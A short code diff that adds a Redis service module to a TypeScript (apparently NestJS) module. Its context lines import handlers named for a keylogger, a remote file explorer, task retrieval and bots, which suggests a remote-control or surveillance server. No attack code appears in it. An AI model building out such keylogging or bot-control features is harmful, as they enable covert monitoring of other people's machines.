@@ -17,6 +17,7 @@ import { WsClientGetExplorer } from "./application/events/ws-client-get-explorer
 import { WsClientKeyLogger } from "./application/events/ws-client-keylogger";
 import { WsApplicationModule } from "../ws-application/ws-application.module";
 import { WsClientGetTasks } from "./application/events/ws-client-get-tasks";
+import { RedisServiceModule } from "@/src/repository/redis/redis.module";
 
 @Module({
   providers: [
@@ -51,6 +52,7 @@ import { WsClientGetTasks } from "./application/events/ws-client-get-tasks";
     forwardRef(() => AuthModule),
     WsBotModule,
     ClientModule,
+    RedisServiceModule,
     WsApplicationModule,
   ],
 })
